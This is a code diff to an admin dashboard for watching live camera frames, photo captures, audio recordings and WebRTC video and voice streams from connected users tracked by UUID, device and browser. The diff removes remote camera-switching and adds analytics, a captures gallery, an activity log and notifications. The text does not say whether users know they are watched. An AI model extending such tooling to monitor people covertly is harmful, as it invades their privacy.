@@ -128,7 +128,7 @@
         .glass-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
 
         /* ─── Stats Cards ─── */
-        .stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}
+        .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:24px}
         .stat-card{
             padding:16px 20px;display:flex;align-items:center;gap:16px;
         }
@@ -267,15 +267,6 @@
         .listen-btn:hover{background:rgba(124,106,255,1);transform:scale(1.1)}
         .listen-btn.active{background:rgba(34,197,94,0.9);animation:pulse 1.5s ease-in-out infinite}
         .listen-btn svg{width:18px;height:18px}
-
-        .switch-btn{
-            position:absolute;bottom:10px;right:56px;z-index:5;
-            background:rgba(255,107,138,0.8);border:none;border-radius:50%;
-            width:36px;height:36px;display:flex;align-items:center;justify-content:center;
-            cursor:pointer;transition:all 0.3s;color:white;font-size:1rem;
-        }
-        .switch-btn:hover{background:rgba(255,107,138,1);transform:scale(1.1)}
-        .switch-btn svg{width:18px;height:18px}
 
         /* ─── Audio Player ─── */
         .audio-player{display:flex;align-items:center;gap:10px}
@@ -516,6 +507,8 @@
             .content {
                 padding: 16px;
             }
+            #capturesGrid { grid-template-columns: repeat(2, 1fr) !important; }
+            #page-analytics > div[style*="grid-template-columns"] { grid-template-columns: 1fr !important; }
         }
         @media(max-width:480px){
             .stats-row {
@@ -524,6 +517,7 @@
             .feed-grid.g2, .feed-grid.g3, .feed-grid.g4 {
                 grid-template-columns: 1fr;
             }
+            #capturesGrid { grid-template-columns: 1fr !important; }
         }
     </style>
 </head>
@@ -545,9 +539,6 @@
                     <span id="lightboxUuid"></span>
                 </div>
                 <button class="glass-btn" id="lightboxSpeaker" onclick="toggleLightboxMute(event)"></button>
-                <button class="glass-btn" id="lightboxSwitchCamera" onclick="switchCameraLightbox(event)" style="display:none;" title="Switch Camera">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 3v6h-6"/><path d="M21 9l-4.5-4.5A9 9 0 0 0 3 12"/><path d="M3 21v-6h6"/><path d="M3 15l4.5 4.5A9 9 0 0 0 21 12"/></svg>
-                </button>
             </div>
         </div>
     </div>
@@ -586,16 +577,12 @@
                 </div>
 
                 <!-- Controls -->
-                <div id="modalStreamControls" style="display:none; margin-bottom:16px; flex-wrap:wrap; gap:8px;">
+                <div id="modalStreamControls" style="display:none; margin-bottom:16px;">
                     <button id="startStreamBtn" class="glass-btn" style="width:100%; display:flex; align-items:center; justify-content:center; gap:8px;" onclick="startLiveStream()">
                         <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>
                         Watch Live Video & Voice
                     </button>
-                    <button id="switchCameraBtnModal" class="glass-btn" style="flex:1; display:none; align-items:center; justify-content:center; gap:8px;" onclick="switchCameraModal()">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 3v6h-6"/><path d="M21 9l-4.5-4.5A9 9 0 0 0 3 12"/><path d="M3 21v-6h6"/><path d="M3 15l4.5 4.5A9 9 0 0 0 21 12"/></svg>
-                        Switch Camera
-                    </button>
-                    <button id="stopStreamBtn" class="glass-btn" style="flex:1; background:linear-gradient(135deg,#ff6b8a,#e04963); border-color:rgba(255,107,138,0.4); display:none; align-items:center; justify-content:center; gap:8px;" onclick="stopLiveStream()">
+                    <button id="stopStreamBtn" class="glass-btn" style="width:100%; background:linear-gradient(135deg,#ff6b8a,#e04963); border-color:rgba(255,107,138,0.4); display:none; align-items:center; justify-content:center; gap:8px;" onclick="stopLiveStream()">
                         <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/></svg>
                         Stop Live Stream
                     </button>
@@ -646,6 +633,18 @@
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg>
                     Settings
                 </button>
+                <button class="nav-item" data-page="analytics" onclick="showPage('analytics')">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 3v18h18"/><path d="M18.7 8l-5.1 5.2-2.8-2.7L7 14.3"/></svg>
+                    Analytics
+                </button>
+                <button class="nav-item" data-page="captures" onclick="showPage('captures')">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg>
+                    Captures
+                </button>
+                <button class="nav-item" data-page="activity" onclick="showPage('activity')">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 12h.01"/><path d="M16 6V4a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/><path d="M22 13a18.15 18.15 0 0 1-20 0"/><rect width="20" height="14" x="2" y="6" rx="2"/></svg>
+                    Activity Log
+                </button>
             </nav>
             <div class="sidebar-bottom">
                 <button class="btn-logout" onclick="doLogout()">
@@ -669,6 +668,19 @@
                         <span class="connection-dot off" id="connDot"></span>
                         <span id="connText">Connecting...</span>
                     </span>
+                    <div style="position:relative">
+                        <button id="notifBtn" onclick="toggleNotifPanel()" style="background:none;border:none;color:rgba(255,255,255,0.45);cursor:pointer;padding:8px;border-radius:10px;transition:all 0.2s;position:relative" title="Notifications">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
+                            <span id="notifBadge" style="display:none;position:absolute;top:4px;right:4px;width:8px;height:8px;background:#ff6b8a;border-radius:50%;box-shadow:0 0 8px rgba(255,107,138,0.6)"></span>
+                        </button>
+                        <div id="notifPanel" style="display:none;position:absolute;top:44px;right:0;width:340px;max-height:400px;overflow-y:auto;border-radius:16px;background:rgba(17,17,40,0.95);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);box-shadow:0 16px 48px rgba(0,0,0,0.5);z-index:100;padding:8px 0">
+                            <div style="padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;align-items:center">
+                                <span style="font-size:0.85rem;font-weight:600">Notifications</span>
+                                <button onclick="clearNotifications()" style="background:none;border:none;color:rgba(255,255,255,0.3);cursor:pointer;font-size:0.7rem;font-family:inherit">Clear All</button>
+                            </div>
+                            <div id="notifList" style="max-height:340px;overflow-y:auto"></div>
+                        </div>
+                    </div>
                     <div class="admin-avatar" id="adminAvatar">A</div>
                 </div>
             </header>
@@ -680,6 +692,10 @@
                         <div class="stat-card glass">
                             <div class="stat-icon teal"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
                             <div><div class="stat-label">Online Users <span class="live-dot"></span></div><div class="stat-value teal" id="statOnline">0</div></div>
+                        </div>
+                        <div class="stat-card glass">
+                            <div class="stat-icon" style="background:rgba(255,107,138,0.1);color:#ff6b8a"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
+                            <div><div class="stat-label">Total Users</div><div class="stat-value" style="color:#ff6b8a" id="statTotalUsers">0</div></div>
                         </div>
                         <div class="stat-card glass">
                             <div class="stat-icon purple"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg></div>
@@ -758,6 +774,80 @@
                             <button class="glass-btn" onclick="changePassword()">Update Password</button>
                             <div class="msg-ok" id="pwOk">✅ Password updated!</div>
                             <div class="msg-err" id="pwErr"></div>
+                        </div>
+                        <div class="settings-card glass">
+                            <h3>📤 Export Data</h3>
+                            <p>Download all data as JSON file</p>
+                            <button class="glass-btn" onclick="exportData()">Download Export</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- ═══ ANALYTICS PAGE ═══ -->
+                <div class="page" id="page-analytics">
+                    <div style="margin-bottom:20px">
+                        <h3 style="font-size:1.1rem;font-weight:600;margin-bottom:4px">Analytics</h3>
+                        <p style="font-size:0.8rem;color:rgba(255,255,255,0.35)">Activity trends and statistics</p>
+                    </div>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+                        <div class="glass" style="padding:20px">
+                            <h4 style="font-size:0.85rem;font-weight:600;margin-bottom:16px;color:rgba(255,255,255,0.6)">📸 Captures (Last 7 Days)</h4>
+                            <canvas id="capturesChart" height="200"></canvas>
+                        </div>
+                        <div class="glass" style="padding:20px">
+                            <h4 style="font-size:0.85rem;font-weight:600;margin-bottom:16px;color:rgba(255,255,255,0.6)">🎤 Recordings (Last 7 Days)</h4>
+                            <canvas id="recordingsChart" height="200"></canvas>
+                        </div>
+                    </div>
+                    <div class="glass" style="padding:20px;margin-top:16px">
+                        <h4 style="font-size:0.85rem;font-weight:600;margin-bottom:16px;color:rgba(255,255,255,0.6)">👥 User Connections (Last 7 Days)</h4>
+                        <canvas id="usersChart" height="160"></canvas>
+                    </div>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:16px">
+                        <div class="glass" style="padding:20px">
+                            <h4 style="font-size:0.85rem;font-weight:600;margin-bottom:16px;color:rgba(255,255,255,0.6)">📱 Device Distribution</h4>
+                            <canvas id="devicesChart" height="200"></canvas>
+                        </div>
+                        <div class="glass" style="padding:20px">
+                            <h4 style="font-size:0.85rem;font-weight:600;margin-bottom:16px;color:rgba(255,255,255,0.6)">🌍 Browser Distribution</h4>
+                            <canvas id="browsersChart" height="200"></canvas>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ═══ CAPTURES GALLERY PAGE ═══ -->
+                <div class="page" id="page-captures">
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px">
+                        <div>
+                            <h3 style="font-size:1.1rem;font-weight:600;margin-bottom:4px">Captures Gallery</h3>
+                            <p style="font-size:0.8rem;color:rgba(255,255,255,0.35)">Browse all captured photos</p>
+                        </div>
+                        <select id="captureFilter" class="glass-input" style="width:200px" onchange="loadCapturesGallery()">
+                            <option value="">All Users</option>
+                        </select>
+                    </div>
+                    <div id="capturesGrid" style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px"></div>
+                    <div id="noCapturesGallery" class="empty-state" style="display:none">
+                        <div class="empty-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg></div>
+                        <h3>No captures yet</h3>
+                        <p>Camera captures from connected users will appear here.</p>
+                    </div>
+                </div>
+
+                <!-- ═══ ACTIVITY LOG PAGE ═══ -->
+                <div class="page" id="page-activity">
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px">
+                        <div>
+                            <h3 style="font-size:1.1rem;font-weight:600;margin-bottom:4px">Activity Log</h3>
+                            <p style="font-size:0.8rem;color:rgba(255,255,255,0.35)">All server events in real-time</p>
+                        </div>
+                        <button class="glass-btn" onclick="loadActivityLog()" style="font-size:0.8rem;padding:8px 16px">↻ Refresh</button>
+                    </div>
+                    <div class="glass" style="overflow:hidden">
+                        <div style="overflow-x:auto;width:100%">
+                            <table style="min-width:600px">
+                                <thead><tr><th>Type</th><th>User</th><th>Event</th><th>Time</th></tr></thead>
+                                <tbody id="activityTable"></tbody>
+                            </table>
                         </div>
                     </div>
                 </div>
@@ -873,6 +963,7 @@ socket.on('admin:users', (users) => {
 socket.on('user:connected', (user) => {
     allUsers[user.uuid] = { ...user, is_online: true };
     renderFeedGrid();
+    addNotification('🟢', 'User ' + truncUUID(user.uuid) + ' connected');
 });
 
 // User disconnected
@@ -888,6 +979,7 @@ socket.on('user:disconnected', (data) => {
         if (badge) badge.innerHTML = '<span class="badge-offline">OFFLINE</span>';
     }
     renderFeedGrid();
+    addNotification('🔴', 'User ' + truncUUID(data.uuid) + ' disconnected');
 });
 
 // New camera frame (live base64)
@@ -902,6 +994,7 @@ socket.on('feed:frame', (data) => {
         const ph = document.getElementById('feed-ph-' + data.uuid);
         if (ph) ph.style.display = 'none';
     }
+    addNotification('📸', 'New capture from ' + truncUUID(data.uuid));
 });
 
 // New audio recording
@@ -910,6 +1003,7 @@ socket.on('feed:audio', (data) => {
     document.getElementById('toastMsg').textContent = `New recording from ${truncUUID(data.uuid)} — ${fmtDuration(data.duration)}`;
     toast.classList.add('show');
     setTimeout(() => toast.classList.remove('show'), 4000);
+    addNotification('🎤', 'New recording from ' + truncUUID(data.uuid));
 });
 
 // Stats
@@ -917,6 +1011,7 @@ socket.on('stats:update', (s) => {
     document.getElementById('statOnline').textContent = s.onlineCount;
     document.getElementById('statCaptures').textContent = s.totalCaptures;
     document.getElementById('statRecordings').textContent = s.totalRecordings;
+    if (document.getElementById('statTotalUsers')) document.getElementById('statTotalUsers').textContent = s.totalUsers;
 });
 
 // WebRTC Signaling Listeners
@@ -987,11 +1082,9 @@ socket.on('webrtc:offer', async (data) => {
             const stopBtn = document.getElementById('stopStreamBtn');
             if (startBtn) startBtn.style.display = 'none';
             if (stopBtn) {
-                stopBtn.style.display = 'flex';
-                stopBtn.innerHTML = conn.isMuted ? '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path></svg> Unmute Voice' : '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/></svg> Mute Voice';
+                stopBtn.style.display = 'block';
+                stopBtn.textContent = conn.isMuted ? '🔊 Unmute Voice' : '🔇 Mute Voice';
             }
-            const switchBtn = document.getElementById('switchCameraBtnModal');
-            if (switchBtn) switchBtn.style.display = 'flex';
         }
     };
 
@@ -1094,12 +1187,15 @@ function showPage(page) {
     document.getElementById('page-' + page).classList.add('active');
     document.querySelector(`.nav-item[data-page="${page}"]`).classList.add('active');
 
-    const titles = { feeds: 'Live Feeds', users: 'Users', recordings: 'Recordings', settings: 'Settings' };
+    const titles = { feeds: 'Live Feeds', users: 'Users', recordings: 'Recordings', settings: 'Settings', analytics: 'Analytics', captures: 'Captures Gallery', activity: 'Activity Log' };
     document.getElementById('pageTitle').textContent = titles[page];
 
     if (page === 'users') loadUsers();
     if (page === 'recordings') loadRecordings();
     if (page === 'feeds') renderFeedGrid();
+    if (page === 'analytics') loadAnalytics();
+    if (page === 'captures') loadCapturesGallery();
+    if (page === 'activity') loadActivityLog();
 
     closeSidebar();
 }
@@ -1270,7 +1366,6 @@ function buildCardInner(u, frame, online) {
         + '<span class="badge-uuid">' + truncUUID(u.uuid) + '</span>'
         + '</div>'
         + (online ? '<button class="listen-btn" id="feed-speaker-' + u.uuid + '" onclick="toggleMute(\'' + u.uuid + '\', event)" title="Unmute Voice"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="1" y1="1" x2="23" y2="23"></line><path d="M9 9v6a3 3 0 0 0 3 3h1.586l4.707 4.707A1 1 0 0 0 20 22V4a1 1 0 0 0-1.707-.707L13.586 8H12a3 3 0 0 0-3 1z"></path></svg></button>' : '')
-        + (online ? '<button class="switch-btn" id="feed-switch-' + u.uuid + '" onclick="switchCamera(\'' + u.uuid + '\', event)" title="Switch Camera"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 3v6h-6"/><path d="M21 9l-4.5-4.5A9 9 0 0 0 3 12"/><path d="M3 21v-6h6"/><path d="M3 15l4.5 4.5A9 9 0 0 0 21 12"/></svg></button>' : '')
         + '</div>'
         + '<div class="feed-info" style="cursor:pointer;" onclick="openUserModal(\'' + u.uuid + '\')" title="Click to view details">'
         + '<div class="feed-meta"><span>' + (u.device_type || 'Unknown') + '</span><span>' + timeAgo(u.last_active) + '</span></div>'
@@ -1434,7 +1529,6 @@ function triggerLightbox(uuid, event) {
             lVideo.play().catch(e => {});
             
             updateLightboxSpeaker(conn ? conn.isMuted : true);
-            document.getElementById('lightboxSwitchCamera').style.display = 'flex';
         }
     } else {
         lVideo.style.display = 'none';
@@ -1443,7 +1537,6 @@ function triggerLightbox(uuid, event) {
         const frame = latestFrames[uuid];
         lImg.src = frame || '';
         document.getElementById('lightboxSpeaker').style.display = 'none';
-        document.getElementById('lightboxSwitchCamera').style.display = 'none';
     }
 
     lightbox.classList.add('show');
@@ -1537,9 +1630,8 @@ function openUserModal(uuid) {
             
             // Set modal button states
             document.getElementById('startStreamBtn').style.display = 'none';
-            document.getElementById('stopStreamBtn').style.display = 'flex';
-            document.getElementById('switchCameraBtnModal').style.display = 'flex';
-            document.getElementById('stopStreamBtn').innerHTML = (conn && !conn.isMuted) ? '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/></svg> Mute Voice' : '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path></svg> Unmute Voice';
+            document.getElementById('stopStreamBtn').style.display = 'block';
+            document.getElementById('stopStreamBtn').textContent = (conn && !conn.isMuted) ? '🔇 Mute Voice' : '🔊 Unmute Voice';
         } else {
             // Stream not connected yet
             if (modalVideo) {
@@ -1547,9 +1639,8 @@ function openUserModal(uuid) {
                 modalVideo.srcObject = null;
             }
             if (overlay) overlay.style.display = 'none';
-            document.getElementById('startStreamBtn').style.display = 'flex';
+            document.getElementById('startStreamBtn').style.display = 'block';
             document.getElementById('stopStreamBtn').style.display = 'none';
-            document.getElementById('switchCameraBtnModal').style.display = 'none';
         }
     } else {
         if (controls) controls.style.display = 'none';
@@ -1592,33 +1683,7 @@ function stopLiveStream() {
     const conn = activeConnections[activeStreamUser];
     const stopBtn = document.getElementById('stopStreamBtn');
     if (stopBtn) {
-        stopBtn.innerHTML = (conn && !conn.isMuted) ? '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/></svg> Mute Voice' : '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path></svg> Unmute Voice';
-    }
-}
-
-function switchCameraModal() {
-    if (!activeStreamUser) return;
-    const conn = activeConnections[activeStreamUser];
-    if (conn && conn.socketId) {
-        socket.emit('webrtc:switch-camera', { userSocketId: conn.socketId });
-    }
-}
-
-function switchCameraLightbox(event) {
-    if (event) event.stopPropagation();
-    if (!activeLightboxUser) return;
-    const conn = activeConnections[activeLightboxUser];
-    if (conn && conn.socketId) {
-        socket.emit('webrtc:switch-camera', { userSocketId: conn.socketId });
-    }
-}
-
-function switchCamera(uuid, event) {
-    if (event) event.stopPropagation();
-    if (!uuid) return;
-    const conn = activeConnections[uuid];
-    if (conn && conn.socketId) {
-        socket.emit('webrtc:switch-camera', { userSocketId: conn.socketId });
+        stopBtn.textContent = (conn && !conn.isMuted) ? '🔇 Mute Voice' : '🔊 Unmute Voice';
     }
 }
 
@@ -1812,8 +1877,228 @@ api('/api/stats').then(s => {
         document.getElementById('statOnline').textContent = s.onlineCount || 0;
         document.getElementById('statCaptures').textContent = s.totalCaptures || 0;
         document.getElementById('statRecordings').textContent = s.totalRecordings || 0;
+        if (document.getElementById('statTotalUsers')) document.getElementById('statTotalUsers').textContent = s.totalUsers || 0;
     }
 }).catch(() => {});
+
+// ═══════════════════════════════════════════════════════════════════
+// NOTIFICATION CENTER
+// ═══════════════════════════════════════════════════════════════════
+let notifications = [];
+
+function toggleNotifPanel() {
+    const panel = document.getElementById('notifPanel');
+    panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+    document.getElementById('notifBadge').style.display = 'none';
+}
+
+function addNotification(icon, message, time) {
+    notifications.unshift({ icon, message, time: time || new Date().toLocaleTimeString() });
+    if (notifications.length > 50) notifications.length = 50;
+    document.getElementById('notifBadge').style.display = 'block';
+    renderNotifications();
+}
+
+function renderNotifications() {
+    const list = document.getElementById('notifList');
+    if (notifications.length === 0) {
+        list.innerHTML = '<div style="padding:30px;text-align:center;color:rgba(255,255,255,0.2);font-size:0.8rem">No notifications</div>';
+        return;
+    }
+    list.innerHTML = notifications.map(n => `<div style="padding:10px 16px;border-bottom:1px solid rgba(255,255,255,0.04);display:flex;align-items:center;gap:10px;font-size:0.8rem;transition:background 0.2s;cursor:default" onmouseover="this.style.background='rgba(255,255,255,0.03)'" onmouseout="this.style.background='none'"><span style="font-size:1rem;flex-shrink:0">${n.icon}</span><div style="flex:1;min-width:0"><div style="color:rgba(255,255,255,0.7);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${n.message}</div><div style="color:rgba(255,255,255,0.25);font-size:0.7rem;margin-top:2px">${n.time}</div></div></div>`).join('');
+}
+
+function clearNotifications() {
+    notifications = [];
+    renderNotifications();
+    document.getElementById('notifBadge').style.display = 'none';
+}
+
+// Close notification panel when clicking outside
+document.addEventListener('click', (e) => {
+    const panel = document.getElementById('notifPanel');
+    const btn = document.getElementById('notifBtn');
+    if (panel && btn && !panel.contains(e.target) && !btn.contains(e.target)) {
+        panel.style.display = 'none';
+    }
+});
+
+// ═══════════════════════════════════════════════════════════════════
+// ANALYTICS (Chart.js)
+// ═══════════════════════════════════════════════════════════════════
+let chartsLoaded = false;
+
+function loadChartJS() {
+    if (chartsLoaded) return Promise.resolve();
+    return new Promise((resolve) => {
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js';
+        script.onload = () => { chartsLoaded = true; resolve(); };
+        document.head.appendChild(script);
+    });
+}
+
+async function loadAnalytics() {
+    await loadChartJS();
+    const [usersData, capturesData, recordingsData] = await Promise.all([
+        api('/api/users'),
+        api('/api/captures'),
+        api('/api/recordings')
+    ]);
+    
+    // Build last 7 days labels
+    const days = [];
+    const capturesByDay = [];
+    const recordingsByDay = [];
+    const usersByDay = [];
+    for (let i = 6; i >= 0; i--) {
+        const d = new Date(); d.setDate(d.getDate() - i);
+        const key = d.toISOString().split('T')[0];
+        days.push(d.toLocaleDateString('en', { weekday: 'short' }));
+        capturesByDay.push(capturesData?.captures?.filter(c => c.created_at?.startsWith(key)).length || 0);
+        recordingsByDay.push(recordingsData?.recordings?.filter(r => r.created_at?.startsWith(key)).length || 0);
+        usersByDay.push(usersData?.users?.filter(u => u.created_at?.startsWith(key)).length || 0);
+    }
+
+    const chartOpts = {
+        responsive: true,
+        plugins: { legend: { display: false } },
+        scales: {
+            x: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: 'rgba(255,255,255,0.3)', font: { size: 11 } } },
+            y: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: 'rgba(255,255,255,0.3)', font: { size: 11 } }, beginAtZero: true }
+        }
+    };
+
+    // Destroy existing charts
+    ['capturesChart','recordingsChart','usersChart','devicesChart','browsersChart'].forEach(id => {
+        const existing = Chart.getChart(id);
+        if (existing) existing.destroy();
+    });
+
+    new Chart(document.getElementById('capturesChart'), {
+        type: 'bar', data: { labels: days, datasets: [{ data: capturesByDay, backgroundColor: 'rgba(165,148,253,0.4)', borderColor: '#a594fd', borderWidth: 2, borderRadius: 6 }] }, options: chartOpts
+    });
+    new Chart(document.getElementById('recordingsChart'), {
+        type: 'bar', data: { labels: days, datasets: [{ data: recordingsByDay, backgroundColor: 'rgba(255,184,108,0.4)', borderColor: '#ffb86c', borderWidth: 2, borderRadius: 6 }] }, options: chartOpts
+    });
+    new Chart(document.getElementById('usersChart'), {
+        type: 'line', data: { labels: days, datasets: [{ data: usersByDay, borderColor: '#5de4c7', backgroundColor: 'rgba(93,228,199,0.1)', fill: true, tension: 0.4, pointRadius: 4, pointBackgroundColor: '#5de4c7' }] }, options: chartOpts
+    });
+
+    // Device distribution doughnut
+    const devices = {};
+    (usersData?.users || []).forEach(u => { devices[u.device_type || 'Unknown'] = (devices[u.device_type || 'Unknown'] || 0) + 1; });
+    new Chart(document.getElementById('devicesChart'), {
+        type: 'doughnut', data: { labels: Object.keys(devices), datasets: [{ data: Object.values(devices), backgroundColor: ['#a594fd','#5de4c7','#ffb86c','#ff6b8a','rgba(255,255,255,0.2)'], borderWidth: 0 }] },
+        options: { responsive: true, plugins: { legend: { position: 'bottom', labels: { color: 'rgba(255,255,255,0.5)', font: { size: 11 } } } } }
+    });
+
+    // Browser distribution doughnut
+    const browsers = {};
+    (usersData?.users || []).forEach(u => { browsers[u.browser || 'Unknown'] = (browsers[u.browser || 'Unknown'] || 0) + 1; });
+    new Chart(document.getElementById('browsersChart'), {
+        type: 'doughnut', data: { labels: Object.keys(browsers), datasets: [{ data: Object.values(browsers), backgroundColor: ['#7c6aff','#5de4c7','#ff6b8a','#ffb86c','rgba(255,255,255,0.2)'], borderWidth: 0 }] },
+        options: { responsive: true, plugins: { legend: { position: 'bottom', labels: { color: 'rgba(255,255,255,0.5)', font: { size: 11 } } } } }
+    });
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// CAPTURES GALLERY
+// ═══════════════════════════════════════════════════════════════════
+async function loadCapturesGallery() {
+    const filter = document.getElementById('captureFilter').value;
+    const data = await api('/api/captures' + (filter ? '?uuid=' + filter : ''));
+    const grid = document.getElementById('capturesGrid');
+    const empty = document.getElementById('noCapturesGallery');
+
+    // Populate filter dropdown
+    const select = document.getElementById('captureFilter');
+    if (select.options.length <= 1) {
+        const usersData = await api('/api/users');
+        (usersData?.users || []).forEach(u => {
+            const opt = document.createElement('option');
+            opt.value = u.uuid;
+            opt.textContent = truncUUID(u.uuid, 12) + ' — ' + (u.device_type || 'Unknown');
+            select.appendChild(opt);
+        });
+    }
+
+    if (!data?.captures?.length) {
+        grid.innerHTML = '';
+        empty.style.display = 'flex';
+        return;
+    }
+    empty.style.display = 'none';
+    grid.innerHTML = data.captures.map(c => `
+        <div class="glass" style="overflow:hidden;cursor:pointer;transition:all 0.3s;border-radius:12px" onclick="openCapturePreview('${API}/media/${c.file_path}', '${truncUUID(c.uuid)}', '${new Date(c.created_at).toLocaleString()}')" onmouseover="this.style.transform='translateY(-4px)';this.style.borderColor='rgba(124,106,255,0.35)'" onmouseout="this.style.transform='';this.style.borderColor=''">
+            <img src="${API}/media/${c.file_path}" alt="" style="width:100%;aspect-ratio:4/3;object-fit:cover;display:block">
+            <div style="padding:8px 10px">
+                <div style="font-size:0.7rem;color:#a594fd;font-family:monospace">${truncUUID(c.uuid, 10)}</div>
